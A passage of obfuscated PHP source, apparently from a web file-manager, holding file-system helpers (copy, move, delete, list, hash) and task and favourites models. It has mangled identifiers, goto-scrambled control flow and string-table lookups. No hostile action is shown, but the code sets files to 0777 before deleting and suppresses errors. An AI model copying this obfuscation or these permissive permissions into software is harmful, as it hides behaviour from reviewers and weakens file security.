$this->iconvSystem($dè¤ìØ¦Îò); @touch($dè¤ìØ¦Îò); if ($EÔšµ™õƒ“) { file_put_contents($dè¤ìØ¦Îò, $EÔšµ™õƒ“); } return is_file($dè¤ìØ¦Îò) ? $this->getPathOuter($dè¤ìØ¦Îò) : !1; } public function mkdir($fã¹Ø–Â×, $CÇ ÈÃÇ†ƒ = REPEAT_SKIP) { $fã¹Ø–Â× = $this->iconvSystem($fã¹Ø–Â×); if (is_dir($fã¹Ø–Â×)) { return $this->getPathOuter($fã¹Ø–Â×); } @mkdir($fã¹Ø–Â×, 511, !0); return is_dir($fã¹Ø–Â×) ? $this->getPathOuter($fã¹Ø–Â×) : !1; } public function copyFile($có”“ÆØ–, $b­…Çö„©ø) { $this->mkdir($this->pathFather($b­…Çö„©ø)); $có”“ÆØ– = $this->iconvSystem($có”“ÆØ–); $b­…Çö„©ø = $this->iconvSystem($b­…Çö„©ø); $a•¥µ…“òÊ = @copy($có”“ÆØ–, $b­…Çö„©ø); return $a•¥µ…“òÊ ? $this->getPathOuter($b­…Çö„©ø) : !1; } public function moveFile($FÈŠ³á·ˆì, $dÒŒ”îßì) { $this->mkdir($this->pathFather($dÒŒ”îßì)); $FÈŠ³á·ˆì = $this->iconvSystem($FÈŠ³á·ˆì); $dÒŒ”îßì = $this->iconvSystem($dÒŒ”îßì); $AÁ§¦ìÕ¹Û = intval(@rename($FÈŠ³á·ˆì, $dÒŒ”îßì)); if (!$AÁ§¦ìÕ¹Û) { if ($AÁ§¦ìÕ¹Û = intval(@copy($FÈŠ³á·ˆì, $dÒŒ”îßì))) { @unlink($FÈŠ³á·ˆì); } } return $AÁ§¦ìÕ¹Û ? $this->getPathOuter($dÒŒ”îßì) : !1; } public function delFile($d›º§²¹’) { $d›º§²¹’ = $this->iconvSystem($d›º§²¹’); if (!@unlink($d›º§²¹’)) { @chmod($d›º§²¹’, 511); if (!@unlink($d›º§²¹’)) { return !1; } } else { return !0; } } public function delFolder($d³ˆàè°õç) { goto F£‹„åÕ»İ; F£‹„åÕ»İ: $fö‹Èò× ´ =& $_SERVER[Ö]; $d³ˆàè°õç = $this->iconvSystem($d³ˆàè°õç); if (!is_dir($d³ˆàè°õç)) { return !0; } goto fÛù­å‰ò¯; fÛù­å‰ò¯: if (!($e¹×ƒŸ®Í = opendir($d³ˆàè°õç))) { return !1; } while (($aĞÒÜó™”„ = readdir($e¹×ƒŸ®Í)) !== !1) { if ($aĞÒÜó™”„ == $fö‹Èò× ´[91] || $aĞÒÜó™”„ == $fö‹Èò× ´[1150]) { continue; } $BÇŒ–Šñ¯› = $d³ˆàè°õç . $fö‹Èò× ´[8] . $aĞÒÜó™”„; if (!is_dir($BÇŒ–Šñ¯›)) { if (!unlink($BÇŒ–Šñ¯›)) { chmod($BÇŒ–Šñ¯›, 511); if (!unlink($BÇŒ–Šñ¯›)) { return !1; } } } else { chmod($BÇŒ–Šñ¯›, 511); $BÇŒ–Šñ¯› = $this->iconvApp($BÇŒ–Šñ¯›); if (!$this->delFolder($BÇŒ–Šñ¯›)) { return !1; } } } closedir($e¹×ƒŸ®Í); goto EÒÓõ¯„òø; EÒÓõ¯„òø: return rmdir($d³ˆàè°õç); goto c˜´ğÄšÛÛ; c˜´ğÄšÛÛ: } public function rename($f³¬‡¦áøğ, $dÙÃñí”ä¶) { goto DŒÁ‚ëÖö‚; DŒÁ‚ëÖö‚: $a‘È÷¸Ô¨ã =& $_SERVER[Ö]; $F†¢Å¾Ÿ¯÷ = $this->fileNameAuto($this->pathFather($f³¬‡¦áøğ), $dÙÃñí”ä¶); $F†¢Å¾Ÿ¯÷ = $this->iconvSystem($F†¢Å¾Ÿ¯÷); goto FØ¥ĞŒ„ÍØ; FØ¥ĞŒ„ÍØ: $f³¬‡¦áøğ = $this->iconvSystem($f³¬‡¦áøğ); $cà¿ê¨†Ü = $this->pathFather($f³¬‡¦áøğ); $b»Ëíá«íì = rtrim($cà¿ê¨†Ü, $a‘È÷¸Ô¨ã[8]) . $a‘È÷¸Ô¨ã[8] . $F†¢Å¾Ÿ¯÷; goto FÒŞÁÕáö«; FÒŞÁÕáö«: $Få¹”˜Ì  = @rename($f³¬‡¦áøğ, $b»Ëíá«íì); $b»Ëíá«íì = $this->iconvApp($b»Ëíá«íì); return $Få¹”˜Ì  ? $this->getPathOuter($b»Ëíá«íì) : !1; goto Cµ°À°ŞÆ; Cµ°À°ŞÆ: } public function size($EóÏ˜ÕËÚ·) { $EóÏ˜ÕËÚ· = $this->iconvSystem($EóÏ˜ÕËÚ·); return (double) abs(sprintf($_SERVER[Ö][1152], @filesize($EóÏ˜ÕËÚ·))); } public function info($f‡®£ƒ‰Üå) { $f‡®£ƒ‰Üå = $this->iconvSystem($f‡®£ƒ‰Üå); if ($this->isFolder($f‡®£ƒ‰Üå)) { return $this->folderInfo($f‡®£ƒ‰Üå); } else { if ($this->isFile($f‡®£ƒ‰Üå)) { return $this->fileInfo($f‡®£ƒ‰Üå); } } return !1; } protected function infoChildren($DÉÈ•á¾‰, &$bÆÖä®öâĞ, $F¿ôä†Ï‡Å = true) { $eÆ”†ªÑ—Š =& $_SERVER[Ö]; $DÉÈ•á¾‰ = rtrim($DÉÈ•á¾‰, $eÆ”†ªÑ—Š[8]) . $eÆ”†ªÑ—Š[8]; if ($F¿ôä†Ï‡Å) { check_abort(); $DÉÈ•á¾‰ = $this->iconvSystem($DÉÈ•á¾‰); } if (!($A»ë¨³å„’ = @opendir($DÉÈ•á¾‰))) { return; } while (($A°Œâ¶­Èª = readdir($A»ë¨³å„’)) !== !1) { if ($A°Œâ¶­Èª == $eÆ”†ªÑ—Š[91] || $A°Œâ¶­Èª == $eÆ”†ªÑ—Š[1150]) { continue; } $e½Ñ¸ŠŒ²» = $DÉÈ•á¾‰ . $A°Œâ¶­Èª; if (is_file($e½Ñ¸ŠŒ²»)) { $bÆÖä®öâĞ[$eÆ”†ªÑ—Š[78]]++; $bÆÖä®öâĞ[$eÆ”†ªÑ—Š[77]] += (double) abs(sprintf($eÆ”†ªÑ—Š[1152], @filesize($e½Ñ¸ŠŒ²»))); } else { $bÆÖä®öâĞ[$eÆ”†ªÑ—Š[79]]++; $this->infoChildren($e½Ñ¸ŠŒ²», $bÆÖä®öâĞ, !1); } } closedir($A»ë¨³å„’); } private function folderInfo($fëŠòù‚´, $f˜Ö†éÀ• = false) { $eİìˆ¬˜Ì =& $_SERVER[Ö]; $fëŠòù‚´ = rtrim($fëŠòù‚´, $eİìˆ¬˜Ì[8]) . $eİìˆ¬˜Ì[8]; $cŠŸÈ¢ğê• = $this->iconvApp($this->pathThis($fëŠòù‚´)); if ($f˜Ö†éÀ•) { return array($eİìˆ¬˜Ì[28] => $cŠŸÈ¢ğê•, $eİìˆ¬˜Ì[75] => $this->getPathOuter($fëŠòù‚´), $eİìˆ¬˜Ì[29] => $eİìˆ¬˜Ì[76]); } $aÀ¾ñöçÀ = array($eİìˆ¬˜Ì[28] => $cŠŸÈ¢ğê•, $eİìˆ¬˜Ì[75] => $this->getPathOuter($fëŠòù‚´), $eİìˆ¬˜Ì[29] => $eİìˆ¬˜Ì[76], $eİìˆ¬˜Ì[183] => @filectime($fëŠòù‚´), $eİìˆ¬˜Ì[106] => @filemtime($fëŠòù‚´), $eİìˆ¬˜Ì[1153] => @fileatime($fëŠòù‚´), $eİìˆ¬˜Ì[1147] => is_readable($fëŠòù‚´), $eİìˆ¬˜Ì[1148] => is_writable($fëŠòù‚´), $eİìˆ¬˜Ì[1154] => get_mode($fëŠòù‚´)); return $aÀ¾ñöçÀ; } private function fileInfo($cˆÁÙ×ÎóÇ, $bè„†â¼Ò = false) { $dä×ø×õÑ¸ =& $_SERVER[Ö]; $A÷Ãç‰Ú„ = $this->iconvApp($this->pathThis($cˆÁÙ×ÎóÇ)); if ($bè„†â¼Ò) { return array($dä×ø×õÑ¸[28] => $A÷Ãç‰Ú„, $dä×ø×õÑ¸[75] => $this->getPathOuter($cˆÁÙ×ÎóÇ), $dä×ø×õÑ¸[29] => $dä×ø×õÑ¸[163], $dä×ø×õÑ¸[77] => $this->size($cˆÁÙ×ÎóÇ), $dä×ø×õÑ¸[156] => $this->ext($A÷Ãç‰Ú„)); } $aëÖ¡­…Ò = array($dä×ø×õÑ¸[28] => $A÷Ãç‰Ú„, $dä×ø×õÑ¸[75] => $this->getPathOuter($cˆÁÙ×ÎóÇ), $dä×ø×õÑ¸[29] => $dä×ø×õÑ¸[163], $dä×ø×õÑ¸[183] => @filectime($cˆÁÙ×ÎóÇ), $dä×ø×õÑ¸[106] => @filemtime($cˆÁÙ×ÎóÇ), $dä×ø×õÑ¸[1153] => @fileatime($cˆÁÙ×ÎóÇ), $dä×ø×õÑ¸[77] => $this->size($cˆÁÙ×ÎóÇ), $dä×ø×õÑ¸[156] => $this->ext($A÷Ãç‰Ú„), $dä×ø×õÑ¸[1147] => is_readable($cˆÁÙ×ÎóÇ), $dä×ø×õÑ¸[1148] => is_writable($cˆÁÙ×ÎóÇ), $dä×ø×õÑ¸[1154] => get_mode($cˆÁÙ×ÎóÇ)); return $aëÖ¡­…Ò; } public function exist($FÜê¾ÈÜ¾Ö) { $FÜê¾ÈÜ¾Ö = $this->iconvSystem($FÜê¾ÈÜ¾Ö); return @file_exists($FÜê¾ÈÜ¾Ö); } public function isFile($d¿ñÕ—œ£á) { $d¿ñÕ—œ£á = $this->iconvSystem($d¿ñÕ—œ£á); return @is_file($d¿ñÕ—œ£á); } public function isFolder($d¤ºä¡Öº) { $d¤ºä¡Öº = $this->iconvSystem($d¤ºä¡Öº); return @is_dir($d¤ºä¡Öº); } public function listPath($Fºí³ó¦ÜË, $E¾±êŒöÌ‘ = false) { goto C·åĞîùÄ; AªÍöåà†ƒ: closedir($a¾¾Œù÷óÆ); return $fã¬‡»¿Úƒ; goto dÆ½Ó£¤Ó’; F§Ó¾¦£´: $fã¬‡»¿Úƒ = array($B‹Š¶œÒö[74] => array(), $B‹Š¶œÒö[73] => array()); if (!($a¾¾Œù÷óÆ = @opendir($Fºí³ó¦ÜË))) { return $fã¬‡»¿Úƒ; } while (($EËŒ˜•ÃŠ‡ = readdir($a¾¾Œù÷óÆ)) !== !1) { if ($EËŒ˜•ÃŠ‡ == $B‹Š¶œÒö[91] || $EËŒ˜•ÃŠ‡ == $B‹Š¶œÒö[1150]) { continue; } $a¿×”‘ˆ˜‹ = $Fºí³ó¦ÜË . $EËŒ˜•ÃŠ‡; if (is_file($a¿×”‘ˆ˜‹)) { $fã¬‡»¿Úƒ[$B‹Š¶œÒö[73]][] = $this->fileInfo($a¿×”‘ˆ˜‹, $E¾±êŒöÌ‘); } else { $fã¬‡»¿Úƒ[$B‹Š¶œÒö[74]][] = $this->folderInfo($a¿×”‘ˆ˜‹, $E¾±êŒöÌ‘); } } goto AªÍöåà†ƒ; C·åĞîùÄ: $B‹Š¶œÒö =& $_SERVER[Ö]; $Fºí³ó¦ÜË = $this->iconvSystem($Fºí³ó¦ÜË); $Fºí³ó¦ÜË = rtrim($Fºí³ó¦ÜË, $B‹Š¶œÒö[8]) . $B‹Š¶œÒö[8]; goto F§Ó¾¦£´; dÆ½Ó£¤Ó’: } public function listAll($bÆéÜÄòìÇ, &$ağ®„»Àï½ = array()) { goto Aˆ°¦ğ” ¼; Aˆ°¦ğ” ¼: $CÏ•»ÚŒøµ =& $_SERVER[Ö]; $bÆéÜÄòìÇ = $this->iconvSystem($bÆéÜÄòìÇ); $bÆéÜÄòìÇ = rtrim($bÆéÜÄòìÇ, $CÏ•»ÚŒøµ[8]) . $CÏ•»ÚŒøµ[8]; goto Dêƒ‘£¬†’; Dêƒ‘£¬†’: if (!($b©•­¨¥ç = @opendir($bÆéÜÄòìÇ))) { return $ağ®„»Àï½; } while (($EÑô†›¥îÂ = readdir($b©•­¨¥ç)) !== !1) { if ($EÑô†›¥îÂ == $CÏ•»ÚŒøµ[91] || $EÑô†›¥îÂ == $CÏ•»ÚŒøµ[1150]) { continue; } $bÎµô°—“É = $bÆéÜÄòìÇ . $EÑô†›¥îÂ; if (is_dir($bÎµô°—“É)) { $ağ®„»Àï½[] = array($CÏ•»ÚŒøµ[75] => $bÎµô°—“É . $CÏ•»ÚŒøµ[8], $CÏ•»ÚŒøµ[76] => 1, $CÏ•»ÚŒøµ[106] => @filemtime($bÎµô°—“É), $CÏ•»ÚŒøµ[77] => 0); $this->listAll($bÎµô°—“É, $ağ®„»Àï½); } else { $ağ®„»Àï½[] = array($CÏ•»ÚŒøµ[75] => $bÎµô°—“É, $CÏ•»ÚŒøµ[76] => 0, $CÏ•»ÚŒøµ[106] => @filemtime($bÎµô°—“É), $CÏ•»ÚŒøµ[77] => $this->size($bÎµô°—“É)); } } closedir($b©•­¨¥ç); goto Aï‰é”…ï¨; Aï‰é”…ï¨: return $ağ®„»Àï½; goto cÄŠš¦Ş; cÄŠš¦Ş: } public function has($fæÄ©Âò±¬, $E¬‰½£ñÍâ = false, $Eæé‹¯Ùé‹ = true) { goto bó•Í¶òâ¬; DÊ˜ÚÅ³ñÅ: if (!($D‰‰ßøÀÎ  = @opendir($fæÄ©Âò±¬))) { return !1; } $aˆ‘‘¥‡ŸÄ = 0; $DêÃ­ö = 0; goto D„çæÙ…ß; bó•Í¶òâ¬: $CèˆªÊÄ =& $_SERVER[Ö]; $fæÄ©Âò±¬ = $this->iconvSystem($fæÄ©Âò±¬); $fæÄ©Âò±¬ = rtrim($fæÄ©Âò±¬, $CèˆªÊÄ[8]) . $CèˆªÊÄ[8]; goto DÊ˜ÚÅ³ñÅ; D„çæÙ…ß: while (($aâß‚ÑÇ›· = readdir($D‰‰ßøÀÎ )) !== !1) { if ($aâß‚ÑÇ›· == $CèˆªÊÄ[91] || $aâß‚ÑÇ›· == $CèˆªÊÄ[1150]) { continue; } $d’‰âô¿òƒ = $fæÄ©Âò±¬ . $aâß‚ÑÇ›·; if ($E¬‰½£ñÍâ) { if (@is_file($d’‰âô¿òƒ)) { $aˆ‘‘¥‡ŸÄ++; } else { $DêÃ­ö++; } continue; } if ($Eæé‹¯Ùé‹) { if (@is_file($d’‰âô¿òƒ)) { return !0; } } else { if (@is_dir($d’‰âô¿òƒ . $CèˆªÊÄ[8])) { return !0; } } } closedir($D‰‰ßøÀÎ ); if ($E¬‰½£ñÍâ) { return array($CèˆªÊÄ[187] => $aˆ‘‘¥‡ŸÄ, $CèˆªÊÄ[188] => $DêÃ­ö); } goto a–Œ·á’ö; a–Œ·á’ö: return !1; goto BÁÉ µ„å¡; BÁÉ µ„å¡: } public function hashSimple($cŠÖ…¼‘í) { goto B´Öí™ğŠõ; fÛ®Éñò©Œ: $c‹µ¥„¯ª° = $this->size($cŠÖ…¼‘í); $DåŒÀÔœ‘Š = 200; $E²Õãàš®É = 50; goto CŒš¨İƒŸÕ; B´Öí™ğŠõ: $EÉ•ñì¤é– =& $_SERVER[Ö]; if (!$cŠÖ…¼‘í) { return md5($EÉ•ñì¤é–[33]); } $cŠÖ…¼‘í = $this->iconvSystem($cŠÖ…¼‘í); goto fÛ®Éñò©Œ; CŒš¨İƒŸÕ: if ($c‹µ¥„¯ª° <= $DåŒÀÔœ‘Š * $E²Õãàš®É) { return $this->hashMd5($cŠÖ…¼‘í) . $c‹µ¥„¯ª°; } $aÑª±÷î×’ = $EÉ•ñì¤é–[33]; $bÕâì¬óÃô = intval($c‹µ¥„¯ª° / $E²Õãàš®É); goto b­ĞÚ‰œŞ; D§‹Øš›•‚: fseek($bĞÇ…®‡ˆƒ, $c‹µ¥„¯ª° - $DåŒÀÔœ‘Š); $aÑª±÷î×’ .= fread($bĞÇ…®‡ˆƒ, $DåŒÀÔœ‘Š); fclose($bĞÇ…®‡ˆƒ); goto F¥™é„Š²; b­ĞÚ‰œŞ: $bĞÇ…®‡ˆƒ = fopen($cŠÖ…¼‘í, $EÉ•ñì¤é–[1155]); if (!$bĞÇ…®‡ˆƒ) { return $aÑª±÷î×’; } for ($bïÀ”­Î¬ = 0; $bïÀ”­Î¬ < $E²Õãàš®É; $bïÀ”­Î¬++) { fseek($bĞÇ…®‡ˆƒ, $bÕâì¬óÃô * $bïÀ”­Î¬); $aÑª±÷î×’ .= fread($bĞÇ…®‡ˆƒ, $DåŒÀÔœ‘Š); } goto D§‹Øš›•‚; F¥™é„Š²: return md5($aÑª±÷î×’) . $c‹µ¥„¯ª°; goto b«äã†•; b«äã†•: } public function getContent($bÊô£½É—) { $bÊô£½É— = $this->iconvSystem($bÊô£½É—); return file_get_contents($bÊô£½É—); } public function setContent($b‰Õ§‘ÆÙË, $d„“„Ç£÷º = '') { $b‰Õ§‘ÆÙË = $this->iconvSystem($b‰Õ§‘ÆÙË); @file_put_contents($b‰Õ§‘ÆÙË, $d„“„Ç£÷º, LOCK_EX); clearstatcache(); return strlen($d„“„Ç£÷º) == filesize($b‰Õ§‘ÆÙË); } public function fileSubstr($a»âõ¹, $FŞÏ‰¼ĞÕƒ = 0, $CôÔºò¹Ã = false) { goto AæÙêêëŞ; a‘Ø•ÀÊšĞ: if ($CôÔºò¹Ã <= 0) { return $a ë“İÈàŒ[33]; } $d§Ø”ğÈ³ = fopen($a»âõ¹, $a ë“İÈàŒ[1155]); if (!$d§Ø”ğÈ³) { return !1; } goto a½Ó˜¿àÏ‰; a½Ó˜¿àÏ‰: fseek($d§Ø”ğÈ³, $FŞÏ‰¼ĞÕƒ); $E¼Î‘à “ƒ = fread($d§Ø”ğÈ³, $CôÔºò¹Ã); fclose($d§Ø”ğÈ³); goto bÀçáÓ÷ğ; bÀçáÓ÷ğ: return $E¼Î‘à “ƒ; goto CôÑÁÒ£ô©; AæÙêêëŞ: $a ë“İÈàŒ =& $_SERVER[Ö]; $a»âõ¹ = $this->iconvSystem($a»âõ¹); if ($CôÔºò¹Ã === !1) { $CôÔºò¹Ã = $this->size($a»âõ¹); } goto a‘Ø•ÀÊšĞ; CôÑÁÒ£ô©: } public function upload($Eß¾ÅòÉ¥, $B”Ğ†×çˆ–, $A·ğ¹¾’¡’ = false, $E²•¦¥îßù = REPEAT_REPLACE) { $cÊ¢Ş½ÅÎ = $this->copyFile($B”Ğ†×çˆ–, $Eß¾ÅòÉ¥); return $cÊ¢Ş½ÅÎ ? $this->getPathOuter($Eß¾ÅòÉ¥) : !1; } public function download($A„»½…»§ò, $FÃÈÙÊÔëÛ) { return $this->iconvSystem($A„»½…»§ò); } } goto fç©’ƒÈ; dÎ„šŞÈ” : class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\56\164\x61\x73\153\x4c\151\x73\x74"; public $field = array("\x6e\141\x6d\145", "\164\x79\x70\x65", "\145\166\145\156\164", "\164\x69\x6d\x65", "\144\x65\x73\143", "\163\171\x73\x74\x65\x6d", "\145\x6e\x61\x62\x6c\x65", "\x6c\141\163\164\x52\165\x6e", "\163\x6f\x72\x74"); public function listData($d²’ø‰ËæÅ = false, $f‰‹æÙ´‰¡ = "\163\x6f\x72\164", $C¹Ó´Û›ÃØ = false) { return parent::listData($d²’ø‰ËæÅ, $f‰‹æÙ´‰¡, $C¹Ó´Û›ÃØ); } public function add($bÊôÂÚ®) { $d°œ¥Î•À =& $_SERVER[Ö]; $D¨Óƒâ’“ = $this->findByName($bÊôÂÚ®[$d°œ¥Î•À[28]]); if ($D¨Óƒâ’“) { return !1; } $bÊôÂÚ®[$d°œ¥Î•À[1379]] = 0; $bÊôÂÚ®[$d°œ¥Î•À[2098]] = $this->getSort(); return parent::insert($bÊôÂÚ®); } private function getSort() { $f©ùÛ­ØŠÀ =& $_SERVER[Ö]; $B‰¨º›İÓ… = parent::listData(); $D‘Šƒï¼Ë = array_to_keyvalue($B‰¨º›İÓ…, $f©ùÛ­ØŠÀ[33], $f©ùÛ­ØŠÀ[2098]); return empty($D‘Šƒï¼Ë) ? 0 : max($D‘Šƒï¼Ë) + 1; } public function update($EÄ’ä“’ …, $AÂ–—±˜ïÛ) { $cÍ­ŠÔ¥®‚ =& $_SERVER[Ö]; $e£å·İ–ˆ… = $this->listData($EÄ’ä“’ …); $b’ÑµÎô«â = $this->findByName($AÂ–—±˜ïÛ[$cÍ­ŠÔ¥®‚[28]]); if (!$e£å·İ–ˆ… || $b’ÑµÎô«â && $b’ÑµÎô«â[$cÍ­ŠÔ¥®‚[363]] != $e£å·İ–ˆ…[$cÍ­ŠÔ¥®‚[363]]) { return !1; } return parent::update($EÄ’ä“’ …, $AÂ–—±˜ïÛ); } public function remove($D„Ö¼ÒÅñ¯, $FÔÒáÁÍÎ = false) { $bÑÆ…ÉƒåÙ =& $_SERVER[Ö]; $C×Œ Œè“ô = $this->listData($D„Ö¼ÒÅñ¯); if (!$C×Œ Œè“ô) { return; } if (!$FÔÒáÁÍÎ && $C×Œ Œè“ô[$bÑÆ…ÉƒåÙ[1073]] == $bÑÆ…ÉƒåÙ[83]) { return !1; } return parent::remove($D„Ö¼ÒÅñ¯); } public function enable($B¨†ß¦˜, $aà‰ é¤ñ) { return $this->update($B¨†ß¦˜, array($_SERVER[Ö][2447] => $aà‰ é¤ñ)); } public function run($eãÄ†…ŒôŒ) { return $this->update($eãÄ†…ŒôŒ, array($_SERVER[Ö][2457] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\162\x5f\146\x61\x76"; protected function cacheFunctionAlias($DÜÕ«ãê»Ş) { $b¤Ëøì®¾Ê =& $_SERVER[Ö]; return array($b¤Ëøì®¾Ê[2458] => array(USER_ID, $b¤Ëøì®¾Ê[2459])); } protected function listData() { $fĞñî¨¥ªÏ =& $_SERVER[Ö]; $F›×öÛ‚Â‡ = array($fĞñî¨¥ªÏ[1405] => USER_ID, $fĞñî¨¥ªÏ[432] => 0); $D´“õÒ®…å = $fĞñî¨¥ªÏ[2460]; $C‡«×ÁìÚ¥ = $this->field($D´“õÒ®…å)->where($F›×öÛ‚Â‡)->order($fĞñî¨¥ªÏ[2461])->select(); return $C‡«×ÁìÚ¥ ? $C‡«×ÁìÚ¥ : array(); } protected function resetCache() { } protected function listView() { goto eˆ®›ä™ø÷; DÆ…ƒÄõ‰: $Cß‚‡ÍáÒõ = array($A¯‡È¸•í‰[379] => array($A¯‡È¸•í‰[380], $F”¥¼Ÿ•í)); $b•ê×™ãó÷ = Model($A¯‡È¸•í‰[745])->listSource($Cß‚‡ÍáÒõ, $e…»«òÖì); $b•ê×™ãó÷ = array_merge($b•ê×™ãó÷[$A¯‡È¸•í‰[73]], $b•ê×™ãó÷[$A¯‡È¸•í‰[74]]); goto fƒÖÄ©éÊ†; fƒÖÄ©éÊ†: $b•ê×™ãó÷ = array_to_keyvalue($b•ê×™ãó÷, $A¯‡È¸•í‰[365]); foreach ($E¤Ò±¾ª³Á as $fÑ‘øª¢Ö => $b¬Û×¦ùø¨) { $EÁ“‡İˆÌ  = $b•ê×™ãó÷[$b¬Û×¦ùø¨[$A¯‡È¸•í‰[75]]]; $EÁ“‡İˆÌ  = $EÁ“‡İˆÌ  ? $EÁ“‡İˆÌ  : array(); $E¤Ò±¾ª³Á[$fÑ‘øª¢Ö] = array_merge($EÁ“‡İˆÌ , $b¬Û×¦ùø¨); } return $E¤Ò±¾ª³Á; goto A³¦ÆöŒ²; eˆ®›ä™ø÷: $A¯‡È¸•í‰ =& $_SERVER[Ö]; $E¤Ò±¾ª³Á = $this->listData(); $eŒñíÑè§à = array_filter_by_field($E¤Ò±¾ª³Á, $A¯‡È¸•í‰[29], $A¯‡È¸•í‰[378]); goto bÑ‹Å²ÀÑî; bÑ‹Å²ÀÑî: $F”¥¼Ÿ•í = array_to_keyvalue($eŒñíÑè§à, $A¯‡È¸•í‰[33], $A¯‡È¸•í‰[75]); if (!$F”¥¼Ÿ•í) { return $E¤Ò±¾ª³Á; } $e…»«òÖì = 2000; goto DÆ…ƒÄõ‰; A³¦ÆöŒ²: } protected function addFav($d¬µÑÛ‚¥, $bˆğ–”ó·Æ = '', $B«ãØåëº– = "\163\157\165\x72\x63\x65") { goto EÔá½¥¹Ş¯; FÕÃÑ²Åóß: $C–‹ÈËÏ†” = array($A‰¨¸îÒ±[1405] => USER_ID, $A‰¨¸îÒ±[432] => 0); $E¸õÄÆšÜ = $this->where($C–‹ÈËÏ†”)->max($A‰¨¸îÒ±[2098]); if (!$E¸õÄÆšÜ) { $E¸õÄÆšÜ = 0; } goto Eøº¼©ñÏ‘; EÔá½¥¹Ş¯: $A‰¨¸îÒ± =& $_SERVER[Ö]; $C–‹ÈËÏ†” = array($A‰¨¸îÒ±[1405] => USER_ID, $A‰¨¸îÒ±[432] => 0, $A‰¨¸îÒ±[384] => $B«ãØåëº–, $A‰¨¸îÒ±[383] => $d¬µÑÛ‚¥); if ($this->where($C–‹ÈËÏ†”)->find()) { return !1; } goto FÕÃÑ²Åóß; Eøº¼©ñÏ‘: if (!$bˆğ–”ó·Æ && $B«ãØåëº– == $A‰¨¸îÒ±[378]) { $eì¥Ÿº¼¨Œ = Model($A‰¨¸îÒ±[1103])->where(array($A‰¨¸îÒ±[379] => $d¬µÑÛ‚¥))->find(); if (!$eì¥Ÿº¼¨Œ) { return !1; } $bˆğ–”ó·Æ = $eì¥Ÿº¼¨Œ[$A‰¨¸îÒ±[28]]; } $bˆğ–”ó·Æ = $this->getAutoName($bˆğ–”ó·Æ); $FÊŒ¡½õŒ× = array($A‰¨¸îÒ±[1405] => USER_ID, $A‰¨¸îÒ±[432] => 0, $A‰¨¸îÒ±[382] => $bˆğ–”ó·Æ, $A‰¨¸îÒ±[383] => $d¬µÑÛ‚¥, $A‰¨¸îÒ±[384] => $B«ãØåëº–, $A‰¨¸îÒ±[2081] => $E¸õÄÆšÜ + 1); goto b‚·‘ééö; b‚·‘ééö: return $this->add($FÊŒ¡½õŒ×); goto B¸Äñ‚ŒÃƒ; B¸Äñ‚ŒÃƒ: } protected function remove($bÈ¡÷ôšïÕ) { $D«æÊã®Ï =& $_SERVER[Ö]; $eÍ¹¦ù¤–÷ = array($D«æÊã®Ï[1405] => USER_ID, $D«æÊã®Ï[381] => $bÈ¡÷ôšïÕ); return $this->where($eÍ¹¦ù¤–÷)->delete(); } protected function removeByName($bëóí‰„Ò) { $f™¾‹­áÀ‘ =& $_SERVER[Ö]; $bÖ÷Îàœ• = array($f™¾‹­áÀ‘[1405] => USER_ID, $f™¾‹­áÀ‘[382] => $bëóí‰„Ò, $f™¾‹­áÀ‘[432] => 0); return $this->where($bÖ÷Îàœ•)->delete(); } protected function rename($A–‘Óê¡ÅÆ, $E›æŒëå˜Ó) { $F˜¢™İé÷ =& $_SERVER[Ö]; if ($A–‘Óê¡ÅÆ == $E›æŒëå˜Ó) { return !1; } $fæÁ¹æ©Ş = $this->getAutoName($E›æŒëå˜Ó); if ($E›æŒëå˜Ó != $fæÁ¹æ©Ş) { return !1; } $a‚Å¸®Ä¦ = array($F˜¢™İé÷[1405] => USER_ID, $F˜¢™İé÷[432] => 0, $F˜¢™İé÷[28] => $A–‘Óê¡ÅÆ); return $this->where($a‚Å¸®Ä¦)->save(array($F˜¢™İé÷[28] => $E›æŒëå˜Ó)); } protected function resetSort($cìæ„©”ìø) { $bšõ—Ñ¨‰µ =& $_SERVER[Ö]; $cìæ„©”ìø = is_array($cìæ„©”ìø) ? $cìæ„©”ìø : array(); $A¸ÚŸèí„Ò = array($bšõ—Ñ¨‰µ[1405] => USER_ID); for ($D¤ª¸ö‡î½ = 0; $D¤ª¸ö‡î½ < count($cìæ„©”ìø); $D¤ª¸ö‡î½++) { $A¸ÚŸèí„Ò[$bšõ—Ñ¨‰µ[381]] = $cìæ„©”ìø[$D¤ª¸ö‡î½]; $this->where($A¸ÚŸèí„Ò)->save(array($bšõ—Ñ¨‰µ[2081] => $D¤ª¸ö‡î½ + 1)); } return !0; } protected function moveTop($CÑÏ¥ÌŸ¤Ÿ) { goto f·’ŠŸò©; f¼Öà”ññ¿: $dìÍ¬Ã¨Œ– = $B°ÅîœÒ; $B°ÅîœÒ = array_remove_value($B°ÅîœÒ, $eˆğ°Â¢¿Â[$fœÅ‰¿¡ø¼[363]]); array_unshift($B°ÅîœÒ, $eˆğ°Â¢¿Â[$fœÅ‰¿¡ø¼[363]]); goto dˆäøÉ‰®Ã; D±Âãµøß©: if (!$eˆğ°Â¢¿Â) { return; } $B°ÅîœÒ = $this->field($fœÅ‰¿¡ø¼[363])->where($E¤„¾İ»¥)->order($fœÅ‰¿¡ø¼[2461])->select(); $B°ÅîœÒ = array_to_keyvalue($B°ÅîœÒ, $fœÅ‰¿¡ø¼[33], $fœÅ‰¿¡ø¼[363]); goto f¼Öà”ññ¿; f·’ŠŸò©: $fœÅ‰¿¡ø¼ =& $_SERVER[Ö]; $E¤„¾İ»¥ = array($fœÅ‰¿¡ø¼[1405] => USER_ID, $fœÅ‰¿¡ø¼[432] => 0); $eˆğ°Â¢¿Â = $this->where($E¤„¾İ»¥)->where(array($fœÅ‰¿¡ø¼[28] => $CÑÏ¥ÌŸ¤Ÿ))->find(); goto D±Âãµøß©; dˆäøÉ‰®Ã: return $this->resetSort($B°ÅîœÒ); goto B“É÷ŒÙ³; B“É÷ŒÙ³: } protected function moveBottom($C©ïÑâƒ´¦) { $C£•¿¹âì” =& $_SERVER[Ö]; $C‹Ø¾ ­â = array($C£•¿¹âì”[1405] => USER_ID, $C£•¿¹âì”[432] => 0); $Dæç£ÇÓİ = $this->where($C‹Ø¾ ­â)->max($C£•¿¹âì”[2098]); $E¨õà‚º™œ = array($C£•¿¹âì”[2098] => $Dæç£ÇÓİ + 1); return $this->where($C‹Ø¾ ­â)->where(array($C£•¿¹âì”[28] => $C©ïÑâƒ´¦))->save($E¨õà‚º™œ); } private function getAutoName($bƒä¡¶ÓÚ×) { goto 